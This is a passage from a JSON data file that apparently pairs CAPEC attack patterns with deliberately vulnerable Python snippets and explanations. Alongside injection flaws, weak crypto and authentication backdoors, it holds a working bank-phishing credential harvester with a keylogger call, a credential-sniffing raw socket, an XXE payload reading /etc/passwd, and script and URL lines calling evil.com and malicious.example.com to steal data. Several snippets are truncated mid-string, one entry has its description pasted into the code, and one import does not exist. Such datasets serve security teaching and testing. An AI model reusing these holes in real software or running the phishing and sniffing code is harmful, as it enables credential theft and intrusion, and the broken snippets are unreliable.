        "code_snippet": "\"\"\"\nimport ctypes\nimport platform\nimport os\n\ndef load_external_library():\n    try:\n        # Attempt to load different libraries based on OS\n        if platform.system() == 'Windows':\n            lib = ctypes.CDLL('custom_lib.dll')\n        else:\n            lib = ctypes.CDLL('./libcustom.so')\n        \n        # Unsafe buffer operation\n        buffer = ctypes.create_string_buffer(10)\n        lib.unsafe_copy(buffer, b'A' * 20)  # Buffer overflow\n        \n        # Blocking operation in non-blocking context\n        result = lib.long_running_operation()\n        \n        # Load potentially untrusted library from current directory\n        dynamic_lib = ctypes.CDLL(os.path.join('.', 'untrusted_lib.dll'))\n        dynamic_lib.execute_function()\n        \n        return True\n    \n    except Exception as e:\n        # Improper error handling - continues execution\n        print(f\"Warning: {e",
        "description": "\"This code demonstrates vulnerable library handling through multiple issues: non-portable library loading, unsafe buffer operations with external libraries, blocking operations in a non-blocking context, and loading potentially untrusted libraries from the current directory. The error handling is inadequate and could leave the application in an insecure state.\""
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import hashlib\nfrom Crypto.Cipher import AES\nfrom datetime import datetime\n\nclass WeakCrypto:\n    def __init__(self):\n        # Using a predictable seed for IV based on timestamp\n        self.iv = str(datetime.now().timestamp()).encode()[:16].ljust(16, b'0')\n        # Using a weak key derivation\n        self.key = hashlib.md5(b'static_password').digest()\n    \n    def encrypt(self, plaintext):\n        # Using ECB mode which is cryptographically weak\n        cipher = AES.new(self.key, AES.MODE_ECB)\n        # Not checking if system's crypto is ready\n        padded = plaintext + (16 - len(plaintext) % 16) * chr(16 - len(plaintext) % 16)\n        return cipher.encrypt(padded.encode())\n    \n    def generate_random(self):\n        # Using a predictable PRNG\n        seed = int(datetime.now().timestamp())\n        return (seed * 1103515245 + 12345) & 0x7fffffff",
        "description": "A vulnerable cryptographic implementation that uses weak initialization vectors, predictable random number generation, insecure ECB mode, and static keys. The code demonstrates multiple cryptographic weaknesses including predictable IV generation, weak key derivation using MD5, use of ECB mode which is vulnerable to pattern analysis, and a linear congruential generator for pseudo-random numbers that is predictable."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "from flask import Flask, redirect, request\nimport smtplib\nimport keylogger\n\napp = Flask(__name__)\n\n@app.route('/login')\ndef fake_login():\n    return '''\n    <div style='font-family: Arial;'>\n    <img src='https://legitimate-bank.com/logo.png'>\n    <h2>Bank Account Verification Required</h2>\n    <form action='/collect' method='POST'>\n        Username: <input type='text' name='username'><br>\n        Password: <input type='password' name='password'><br>\n        <input type='submit' value='Verify Account'>\n    </form>\n    </div>\n    '''\n\n@app.route('/collect', methods=['POST'])\ndef collect_credentials():\n    username = request.form['username']\n    password = request.form['password']\n    \n    # Store stolen credentials\n    with open('stolen_creds.txt', 'a') as f:\n        f.write(f'{username}:{password}\\n')\n    \n    # Start keylogger silently\n    keylogger.start()\n    \n    # Redirect to legitimate site\n    return redirect('https://real-bank.com')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)",
        "description": "This code creates a malicious phishing website that mimics a legitimate bank login page. It implements several attack vectors: UI misrepresentation (CWE-451) through fake banking interface, URL redirection (CWE-601) to legitimate site after credential theft, embedded malicious code (CWE-506) via hidden keylogger, trojan functionality (CWE-507) appearing as legitimate login while stealing data, and spyware capabilities (CWE-512) collecting user credentials without explicit consent."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml_data(xml_input):\n    try:\n        # Vulnerable: No input validation or sanitization\n        tree = ET.fromstring(xml_input)\n        \n        # Vulnerable: Using eval on XML content\n        for elem in tree.findall('.//command'):\n            command = elem.text\n            eval(command)  # Dangerous execution of XML content\n            \n        # Vulnerable: Processing external entities without restriction\n        parser = ET.XMLParser(resolve_entities=True)\n        tree = ET.parse(xml_input, parser)\n        \n        return tree\n    except Exception as e:\n        return str(e)\n\n# Example usage\nxml_data = '''<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ELEMENT foo ANY>\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>\n<command>print('compromised')</command>\n<data>&xxe;</data>\n</root>'''",
        "description": "This code demonstrates multiple XML-related vulnerabilities: it processes XML without validation against a schema, allows for XML entity expansion attacks, enables XML external entity (XXE) processing, and executes commands found in XML content. The code accepts untrusted XML input and processes it without proper sanitization, making it vulnerable to XML injection, XXE attacks, and arbitrary code execution."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "def process_user_data(user_input):\n    buffer = bytearray(16)\n    input_bytes = user_input.encode()\n    # Vulnerable: No size checking before copy\n    for i in range(len(input_bytes)):\n        buffer[i] = input_bytes[i]\n    return buffer\n\ndef main():\n    user_data = input('Enter data: ')\n    result = process_user_data(user_data)",
        "description": "This code contains a classic buffer overflow vulnerability (CWE-120) where user input is copied into a fixed-size buffer (16 bytes) without size validation. If the user provides input longer than 16 bytes, it will write beyond the buffer's boundaries, potentially corrupting adjacent memory or causing a crash. The code also demonstrates CWE-119 by performing operations outside the bounds of the allocated memory buffer."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "from flask import Flask, request\n\ndef process_ssi(content):\n    # Directly process SSI directives from user input without sanitization\n    if '<!--#include' in content:\n        # Implement basic SSI processing\n        if 'file=' in content:\n            filename = content.split('file=\"')[1].split('\"')[0]\n            with open(filename, 'r') as f:\n                return f.read()\n        elif 'exec=' in content:\n            cmd = content.split('exec=\"')[1].split('\"')[0]\n            import os\n            return os.popen(cmd).read()\n    return content\n\napp = Flask(__name__)\n\n@app.route('/process', methods=['POST'])\ndef process_content():\n    user_content = request.form.get('content', '')\n    # Vulnerable: directly processing SSI directives from user input\n    processed_content = process_ssi(user_content)\n    return processed_content",
        "description": "This code demonstrates a vulnerable implementation that allows Server Side Include (SSI) injection by directly processing user-provided SSI directives without proper validation or sanitization. The code accepts user input containing SSI directives and processes them to include files or execute commands, potentially allowing attackers to access sensitive files or execute arbitrary commands on the server."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "from flask import Flask, request, make_response\nimport uuid\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    if check_credentials(username, password):\n        session_token = str(uuid.uuid4())\n        response = make_response('Login successful')\n        # Vulnerable: Cookie sent without secure flag and over HTTP\n        response.set_cookie('session_token', session_token)\n        return response\n\n@app.route('/api/user_data', methods=['GET'])\ndef get_user_data():\n    session_token = request.cookies.get('session_token')\n    # Vulnerable: No protection against replay attacks\n    if session_token in active_sessions:\n        return {'user_data': 'sensitive_information'}\n    return {'error': 'Unauthorized'}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)",
        "description": "This code demonstrates a vulnerable session management implementation that is susceptible to session sidejacking. It sets cookies without the Secure flag over HTTP, transmits sensitive information in cleartext, and lacks protection against replay attacks. The session token is transmitted unencrypted and can be easily captured and replayed by an attacker to hijack the user's session."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "import tkinter as tk\nimport threading\nimport webbrowser\n\nclass MaliciousUI:\n    def __init__(self):\n        self.root = tk.Tk()\n        self.root.attributes('-topmost', True)\n        self.root.geometry('300x150')\n        self.root.title('System Security Update')\n        \n        self.login_frame = tk.Frame(self.root)\n        self.hidden_frame = tk.Frame(self.root)\n        \n        # Visible login button\n        self.login_btn = tk.Button(self.login_frame, text='Login to Account', command=self.show_hidden)\n        self.login_btn.pack(pady=20)\n        \n        # Hidden malicious button overlaying\n        self.hidden_btn = tk.Button(self.hidden_frame, text='Authorize Payment', command=self.malicious_action)\n        \n        self.login_frame.pack()\n        \n    def show_hidden(self):\n        threading.Timer(0.1, self.swap_frames).start()\n        \n    def swap_frames(self):\n        self.login_frame.pack_forget()\n        self.hidden_frame.pack()\n        self.hidden_btn.pack(pady=20)\n        # Position hidden button exactly where login button was\n        self.root.update()\n        \n    def malicious_action(self):\n        webbrowser.open('http://malicious.example.com/steal_credentials')\n        self.root.destroy()\n        \n    def run(self):\n        self.root.mainloop()\n\nui = MaliciousUI()\nui.run()",
        "description": "The code creates a deceptive UI that tricks users by showing what appears to be a legitimate login button, but quickly switches context to display a malicious button in the exact same position. It exploits UI layer manipulation, context switching, and input misinterpretation vulnerabilities to make users unknowingly interact with a different interface than intended. When triggered, it performs a malicious action by directing to a credential-stealing website."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import os\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/render', methods=['GET'])\ndef render_page():\n    # CWE-20: No input validation on user_content\n    user_content = request.args.get('content', '')\n    \n    # CWE-116: No proper encoding of output\n    # CWE-250: Running with unnecessary privileges\n    os.system('whoami')\n    \n    # CWE-285: Missing authorization check\n    # CWE-638: Not checking access rights consistently\n    template = '''<html>\n        <body>\n            <div>%s</div>\n            <script>\n                // Bypassing browser security zones\n                document.domain = \"trusted-domain.com\";\n                // Executing privileged operations\n                window.eval(decodeURIComponent(location.hash.substr(1)));\n            </script>\n        </body>\n    </html>''' % user_content\n    \n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable Flask application demonstrates a security zone bypass attack by accepting unsanitized user input and rendering it directly in a template, combined with client-side script that attempts to modify document.domain and execute arbitrary JavaScript. The code runs with elevated privileges, lacks proper authorization checks, and fails to properly validate or encode user input, making it susceptible to XSS and privilege escalation attacks."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "\"\"\"\nimport http.server\nimport urllib.parse\n\nclass VulnerableProxy(http.server.SimpleHTTPRequestHandler):\n    def do_POST(self):\n        content_length = self.headers.get('Content-Length', '')\n        transfer_encoding = self.headers.get('Transfer-Encoding', '')\n        \n        # Vulnerable handling of ambiguous headers\n        if content_length and transfer_encoding == 'chunked':\n            # Incorrectly process both headers without proper validation\n            body = self.rfile.read(int(content_length))\n            \n            # Vulnerable header construction without sanitization\n            forwarded_headers = f'''POST {self.path",
        "description": "\"This code demonstrates a vulnerable HTTP proxy implementation that incorrectly handles HTTP request parsing and header forwarding. It fails to properly validate and sanitize headers, especially when dealing with Content-Length and Transfer-Encoding headers, making it susceptible to request smuggling and splitting attacks. The code also improperly handles CRLF sequences in headers and fails to ensure consistent interpretation of HTTP requests between different components.\""
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "def log_user_activity(request):\n    user_input = request.GET.get('user_input', '')\n    username = request.GET.get('username', '')\n    \n    # Vulnerable logging of user input without sanitization\n    log_entry = f\"User {username} submitted: {user_input}\"\n    with open('server.log', 'a') as log_file:\n        log_file.write(log_entry)\n    \n    # Vulnerable XSS - directly embedding user input into HTML\n    response_html = f\"<div>Latest activity: <img src='{user_input}' /></div>\"\n    return HttpResponse(response_html)",
        "description": "This code demonstrates a combination of log injection and XSS vulnerabilities. It accepts user input and logs it without sanitization, allowing log tampering. The same unsanitized input is then embedded directly into an HTML img tag's src attribute, enabling XSS attacks through malicious image sources. The code fails to implement proper input validation or sanitization for both logging and HTML output generation."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    \n    # Vulnerable session handling\n    if authenticate(username, password):\n        response = make_response('Login successful')\n        # Setting cookie without secure flags\n        response.set_cookie('session_id', generate_session_id(),\n                           httponly=False,\n                           secure=False)\n        # Enable TRACE method\n        app.config['ENABLE_TRACE'] = True\n        return response\n\ndef authenticate(username, password):\n    return True\n\ndef generate_session_id():\n    return '12345'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates a vulnerable web application that enables Cross-Site Tracing (XST) by explicitly allowing the HTTP TRACE method and setting cookies without proper security flags. The code sets session cookies without the HttpOnly and Secure flags, making them accessible via JavaScript and transmittable over non-HTTPS connections. This allows an attacker to potentially steal session cookies through XST attacks. The application also lacks CSRF protection and proper input validation, making it susceptible to various cross-site attacks."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import mysql.connector\nimport os\n\ndef store_user_data(username, comment):\n    conn = mysql.connector.connect(\n        host='localhost',\n        user='admin',\n        password='password123',\n        database='userdb'\n    )\n    cursor = conn.cursor()\n    \n    # Vulnerable SQL query storing unvalidated user input\n    sql = f\"INSERT INTO comments (username, comment) VALUES ('{username}', '{comment}')\"\n    cursor.execute(sql)\n    conn.commit()\n\ndef process_comments():\n    conn = mysql.connector.connect(\n        host='localhost',\n        user='admin',\n        password='password123',\n        database='userdb'\n    )\n    cursor = conn.cursor()\n    \n    cursor.execute(\"SELECT comment FROM comments\")\n    comments = cursor.fetchall()\n    \n    for comment in comments:\n        # Vulnerable command execution using stored data\n        os.system(f\"echo {comment[0]} >> log.txt\")",
        "description": "This code demonstrates a stored SQL injection vulnerability that leads to command injection. It accepts user input without validation and stores it directly in a database using string formatting. Later, the stored data is retrieved and used directly in a system command, allowing for both SQL injection during storage and command injection during processing."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\nfrom models import User\n\ndef find_user_by_name(user_input):\n    engine = create_engine('mysql://user:password@localhost/db')\n    Session = sessionmaker(bind=engine)\n    session = Session()\n    \n    # Vulnerable: Direct string concatenation in filter\n    raw_query = \"SELECT * FROM users WHERE username = '\" + user_input + \"'\"\n    result = session.execute(raw_query)\n    \n    # Also vulnerable: Using string formatting in filter\n    users = session.query(User).filter(\"username = '%s'\" % user_input).all()\n    \n    return users",
        "description": "This code demonstrates vulnerable ORM usage in SQLAlchemy where user input is directly concatenated into SQL queries instead of using parameterized queries or proper ORM methods. The code allows for SQL injection through both raw SQL execution and improper filter usage, bypassing the ORM's built-in safety mechanisms."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\nimport xml.etree.ElementTree as ET\nfrom sqlalchemy import create_engine\nimport zeep\n\napp = Flask(__name__)\nengine = create_engine('mysql://user:password@localhost/db')\n\n@app.route('/soap', methods=['POST'])\ndef process_soap_request():\n    soap_data = request.data\n    root = ET.fromstring(soap_data)\n    \n    # Extract user parameters from SOAP message\n    username = root.find('.//username').text\n    query = root.find('.//query').text\n    \n    # Vulnerable SQL query construction\n    sql = f\"SELECT * FROM users WHERE username = '{username",
        "description": "\"A vulnerable SOAP web service that processes XML messages and executes SQL queries without proper input validation or parameterization. The code directly embeds user-supplied values from the SOAP message into SQL queries and exposes detailed error messages.\""
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "from flask import Flask, jsonp, request\n\napp = Flask(__name__)\n\n@app.route('/api/user_data')\ndef get_user_data():\n    callback = request.args.get('callback', '')\n    sensitive_data = {\n        'username': 'admin',\n        'credit_card': '4111-1111-1111-1111',\n        'ssn': '123-45-6789'\n    }\n    \n    # Vulnerable: No origin validation and allows any domain to access the data\n    response = f'{callback}({str(sensitive_data)})'\n    return response, 200, {'Content-Type': 'application/javascript'}\n\n@app.route('/profile')\ndef profile():\n    # Vulnerable: Renders user input directly in the page\n    user_input = request.args.get('name', '')\n    return f'<script src=\"http://evil.com/steal.js\"></script>\\nWelcome, {user_input}!'",
        "description": "This code demonstrates a vulnerable JSON API endpoint that enables JSON hijacking and XSS attacks. It lacks origin validation, CSRF protection, and proper input sanitization. The server returns sensitive data wrapped in JSONP callback without verifying the requesting origin, allowing cross-domain data theft. Additionally, it directly renders user input in HTML output without sanitization, enabling XSS attacks."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import random\n\ndef generate_session_token():\n    return str(random.randint(1000, 9999))\n\ndef authenticate_user(username, password):\n    # Weak password check - only verifies length\n    if len(password) < 4:\n        return False\n    \n    # Simple hardcoded credentials\n    valid_credentials = {'admin': 'pass123'}\n    \n    if username in valid_credentials:\n        return valid_credentials[username] == password\n    return False\n\ndef login_system():\n    session_token = generate_session_token()\n    attempts = 0\n    \n    while attempts < 100:  # No real limit on login attempts\n        username = input('Username: ')\n        password = input('Password: ')\n        \n        if authenticate_user(username, password):\n            return session_token\n        \n        attempts += 1\n    \n    return None",
        "description": "This vulnerable code demonstrates multiple security weaknesses including weak session token generation using predictable random values, insufficient password requirements, unlimited authentication attempts allowing brute force attacks, and hardcoded credentials. The session token is a simple 4-digit number, making it easy to guess through exhaustive search."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "\"\"\"\nimport ctypes\nimport mmap\nimport os\n\nclass InsecureHardwareInterface:\n    def __init__(self):\n        self.mem_file = os.open('/dev/mem', os.O_RDWR)\n        self.mem = mmap.mmap(self.mem_file, 1024, mmap.MAP_SHARED, mmap.PROT_WRITE)\n        self.debug_mode = False\n        \n    def ioctl_handler(self, cmd, arg):\n        # No access control check before executing privileged commands\n        if cmd == 0x1:\n            self.debug_mode = True\n            return self._activate_debug_features()\n        elif cmd == 0x2:\n            return self._write_to_registers(arg)\n    \n    def _write_to_registers(self, value):\n        # Direct memory-mapped register access without validation\n        self.mem[0:4] = value.to_bytes(4, 'little')\n        \n    def _activate_debug_features(self):\n        if self.debug_mode:\n            # Exposes test/debug functionality during runtime\n            self.mem[0x100:0x104] = b'\\\\x01\\\\x00\\\\x00\\\\x00'\n            return True\n        return False\n\ndef main():\n    hw_interface = InsecureHardwareInterface()\n    # Any user can send privileged IOCTL commands\n    hw_interface.ioctl_handler(0x1, None)\n    hw_interface.ioctl_handler(0x2, 0xdeadbeef)\n\"\"\",\n    \"description\": \"This code demonstrates an insecure hardware interface implementation that allows unauthorized access to hardware registers through memory-mapped I/O, lacks proper access controls for IOCTL commands, and permits activation of debug features during runtime. The code directly manipulates memory registers without proper validation or protection mechanisms, making it vulnerable to interface manipulation attacks.\"",
        "description": "\"This code demonstrates an insecure hardware interface implementation that allows unauthorized access to hardware registers through memory-mapped I/O, lacks proper access controls for IOCTL commands, and permits activation of debug features during runtime. The code directly manipulates memory registers without proper validation or protection mechanisms, making it vulnerable to interface manipulation attacks.\""
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.users = {'admin': 'password123'}\n        self.login_attempts = {}\n        self.debug_mode = True\n\n    def authenticate(self, username, password):\n        # Debug backdoor - unsafe debug access\n        if self.debug_mode and password.endswith('_debug'):\n            return True\n\n        # No rate limiting on login attempts\n        if username not in self.login_attempts:\n            self.login_attempts[username] = 0\n        self.login_attempts[username] += 1\n\n        # Weak password validation\n        if username in self.users:\n            # Simple string comparison without secure hash\n            return self.users[username] == password\n        return False\n\n    def reset_password(self, username, new_password):\n        # No authentication check for password reset\n        if username in self.users:\n            self.users[username] = new_password\n            return True\n        return False\n\n# Usage\nauth = AuthenticationSystem()\nauth.authenticate('admin', 'wrong_password_debug')  # Bypasses authentication\nauth.reset_password('admin', 'new_password')  # No verification required",
        "description": "This code demonstrates multiple authentication vulnerabilities including a debug backdoor, lack of brute force protection, weak password storage/comparison, and authentication bypass through password reset. It shows improper authentication (CWE-287), unsafe debug access (CWE-1244), no protection against excessive authentication attempts (CWE-307), authentication bypass (CWE-305), and weak authentication mechanisms (CWE-1390)."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.is_admin = False\n        self.auth_token = None\n\n    def login(self, username, password):\n        if self.auth_token:  # Assumes token is always valid\n            return True\n\n        # Weak authentication - only checks length\n        if len(username) > 0 and len(password) > 0:\n            self.is_admin = True\n            self.auth_token = 'static_token_123'\n            return True\n        return False\n\n    def get_sensitive_data(self):\n        # No authentication check, assumes previous authentication is valid\n        if hasattr(self, 'is_admin'):  # Relies on mutable attribute\n            return 'SECRET_DATA'\n        return None\n\n    def backdoor_access(self):\n        # Alternative authentication path\n        self.is_admin = True\n        return True",
        "description": "This code demonstrates multiple authentication vulnerabilities: weak validation that only checks length, reliance on mutable state (is_admin), authentication bypass through a static token, and an alternate authentication path. The system also fails to properly validate authentication state before accessing sensitive data."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "def system_probe():\n    sensitive_data = {\n        'api_keys': {'prod': 'sk_live_123456'},\n        'passwords': {'admin': 'secret123'},\n        'debug_mode': True\n    }\n    \n    def search_files(path):\n        import os\n        results = []\n        for root, _, files in os.walk(path):\n            for file in files:\n                if file.endswith('.log') or file.endswith('.conf'):\n                    with open(os.path.join(root, file)) as f:\n                        results.append(f.read())\n        return results\n    \n    def debug_info():\n        if sensitive_data['debug_mode']:\n            return str(sensitive_data)\n        return 'Debug mode disabled'\n    \n    user_path = input('Enter path to search: ')\n    logs = search_files(user_path)\n    print(f'System info: {debug_info()}')\n    return {'logs': logs, 'system_info': debug_info()}",
        "description": "This code demonstrates multiple security vulnerabilities including exposing sensitive information through debug output, accepting untrusted search paths for file operations, and potentially leaking sensitive data through system probing. It allows an attacker to gather sensitive information about the system through various methods including direct exposure of API keys and passwords, unrestricted file system access, and debug information disclosure."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\nimport sys\n\ndef sniff_network():\n    # Create a raw socket\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    except socket.error as e:\n        print('Socket could not be created.')\n        sys.exit()\n    \n    # Receive data packets\n    while True:\n        packet = s.recvfrom(65565)\n        # Store packet data\n        packet_data = packet[0]\n        ip_header = packet_data[0:20]\n        \n        # Extract sensitive information (username/password)\n        if b'username=' in packet_data or b'password=' in packet_data:\n            with open('captured_data.txt', 'ab') as f:\n                f.write(packet_data)\n                \ndef send_sensitive_data():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 80))\n    # Sending sensitive data in cleartext\n    credentials = 'username=admin&password=secret123'\n    s.send(credentials.encode())\n    s.close()",
        "description": "This vulnerable code demonstrates network sniffing and cleartext transmission of sensitive data. It creates a raw socket to capture network packets and specifically looks for sensitive information like usernames and passwords in the packet data. The code also includes a function that transmits credentials in cleartext over an unencrypted connection, making it susceptible to network sniffing attacks. The implementation lacks message integrity checks and proper encryption, violating several security principles related to secure data transmission."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "def process_user_path(user_input):\n    # Basic filter for direct path traversal attempts\n    blacklist = ['../', './', '/']\n    \n    # Incomplete URL decode check - only checks single encoding\n    decoded_input = urllib.parse.unquote(user_input)\n    \n    # Check against blacklist before complete decoding\n    if any(bad_char in decoded_input for bad_char in blacklist):\n        return 'Invalid input'\n    \n    # Process the input without checking for double encoding\n    # Vulnerable to double encoded path traversal like %252E%252E%252F\n    file_path = '/var/www/files/' + decoded_input\n    \n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except:\n        return 'File not found'",
        "description": "This code is vulnerable to double encoding attacks because it only performs a single URL decode operation before checking for malicious input. An attacker could use double encoding (e.g., %252E%252E%252F for '../') to bypass the security checks. The input validation occurs before complete decoding, and the blacklist is incomplete as it doesn't account for all encoding variations. This allows for path traversal attacks using double-encoded characters."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "\"\"\"\nimport logging\nimport sys\nimport socket\n\nclass ProductionServer:\n    def __init__(self):\n        self.debug_mode = True  # Debug mode left enabled in production\n        self.debug_token = 'debug_secret_123'  # Hardcoded debug token\n        self.security_identifier = None  # Missing security identifier\n        \n    def process_request(self, request):\n        if self.debug_mode:\n            logging.debug(f'Processing request with sensitive data: {request",
        "description": "\"This code demonstrates a vulnerable server implementation that leaves debug interfaces enabled in production. It includes hardcoded debug tokens, exposes sensitive information through debug logging, allows runtime activation of test features, and lacks proper security identifier mechanisms. The debug interface can be exploited to bypass security controls and access sensitive system information.\""
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class FileManager:\n    def __init__(self):\n        self.is_authenticated = False\n\n    def authenticate(self, username, password):\n        # Weak authentication - no actual check\n        self.is_authenticated = True\n\n    def access_sensitive_file(self, filename):\n        # No proper privilege check, only basic authentication\n        if self.is_authenticated:\n            with open(filename, 'r') as f:\n                return f.read()\n\n    def modify_system_settings(self, settings):\n        # Critical operation without proper privilege verification\n        if self.is_authenticated:\n            with open('system_config.ini', 'w') as f:\n                f.write(settings)\n\ndef main():\n    fm = FileManager()\n    fm.authenticate('user', '123')\n    # Any authenticated user can access sensitive files\n    secret_data = fm.access_sensitive_file('confidential.txt')\n    # Any authenticated user can modify system settings\n    fm.modify_system_settings('dangerous_config')",
        "description": "This code demonstrates improper privilege management by allowing any authenticated user to access sensitive files and modify system settings without proper privilege checks. The authentication is weak and there's no distinction between regular users and administrators. The code fails to implement proper access controls, allowing unauthorized actors to perform privileged operations."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def process_data(input_data):\n    buffer = bytearray(10)  # Fixed size buffer\n    source = bytearray(input_data, 'utf-8')\n    \n    # Vulnerable: using source buffer size instead of destination buffer size\n    for i in range(len(source)):\n        buffer[i] = source[i]  # Potential buffer overflow\n    \n    # Vulnerable: reading beyond buffer bounds\n    offset = int(input_data.split(',')[0])\n    result = buffer[offset:offset+5]  # No bounds checking on offset\n    \n    return bytes(result).decode('utf-8')",
        "description": "This vulnerable code demonstrates multiple buffer-related issues: it attempts to copy data without checking destination buffer size limits, uses unchecked offsets for buffer access, and performs unsafe reads based on user-controlled input. The function could lead to buffer overflows, buffer over-reads, and access to unintended memory locations when provided with malicious input."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "class SharedResourceManager:\n    def __init__(self):\n        self.shared_resource = {}\n        self.lock = None  # Intentionally no lock implementation\n\n    def write_data(self, key, value, process_id):\n        # Vulnerable: No synchronization mechanism\n        temp = self.shared_resource.get(key, None)\n        # Simulating some processing time where race condition can occur\n        import time\n        time.sleep(0.1)\n        self.shared_resource[key] = value\n\n    def read_data(self, key, process_id):\n        # Vulnerable: Direct access to shared resource without isolation\n        return self.shared_resource.get(key, None)\n\ndef process_1(manager):\n    manager.write_data('sensitive_data', 'secret123', 1)\n\ndef process_2(manager):\n    # Potentially malicious process accessing same resource\n    data = manager.read_data('sensitive_data', 2)\n    # Can modify or leak sensitive data\n    manager.write_data('sensitive_data', 'compromised', 2)\n\n# Usage\nmanager = SharedResourceManager()\nimport threading\nt1 = threading.Thread(target=process_1, args=(manager,))\nt2 = threading.Thread(target=process_2, args=(manager,))\nt1.start()\nt2.start()",
        "description": "This code demonstrates multiple shared resource vulnerabilities: lack of proper synchronization between threads (CWE-662), no isolation between trusted and untrusted processes accessing shared resources (CWE-1189), and potential exposure of sensitive data through shared resources (CWE-1421). The SharedResourceManager class implements a shared resource without proper locks or access controls, allowing multiple processes to simultaneously access and modify the data, leading to race conditions and potential data leakage."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import socket\nimport threading\n\ndef handle_client(client_socket):\n    while True:\n        try:\n            # Keep connection open indefinitely without timeout\n            data = client_socket.recv(1024)\n            # No limit on number of concurrent connections\n            client_socket.send(data * 100)  # Amplify response\n        except:\n            pass\n\ndef server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 12345))\n    server_socket.listen(65535)  # Maximum backlog size\n    \n    while True:\n        client, addr = server_socket.accept()\n        # Create new thread for each connection without limit\n        threading.Thread(target=handle_client, args=(client,)).start()\n\nif __name__ == '__main__':\n    server()",
        "description": "This vulnerable server code demonstrates multiple resource management issues: it creates unlimited threads for each connection, maintains connections indefinitely, has no rate limiting, amplifies network responses, and lacks proper resource cleanup. This makes it susceptible to flooding attacks where an attacker can exhaust system resources through numerous concurrent connections."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "def get_user_file(filename):\n    base_dir = '/home/user/files/'\n    file_path = base_dir + filename\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except Exception as e:\n        return f'Error: {str(e)}'\n\n# Example usage that could be exploited:\n# get_user_file('../../../etc/passwd')",
        "description": "A vulnerable file access function that constructs a file path by directly concatenating user input without sanitization, allowing path traversal attacks through '../' sequences to access files outside the intended directory."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "from flask import Flask, send_from_directory\nimport os\n\napp = Flask(__name__)\n\n@app.route('/files/<path:filepath>')\ndef serve_files(filepath):\n    base_dir = '/var/www/files/'\n    full_path = os.path.join(base_dir, filepath)\n    \n    if os.path.isdir(full_path):\n        files = os.listdir(full_path)\n        return '\\n'.join(files)\n    \n    return send_from_directory(base_dir, filepath)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable Flask application allows directory listing and unrestricted file access. It exposes directory contents when a path ends with a directory name and allows direct access to any file within the base directory. No authentication or authorization checks are implemented, and the application does not validate or sanitize the filepath parameter, potentially exposing sensitive files and directories."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
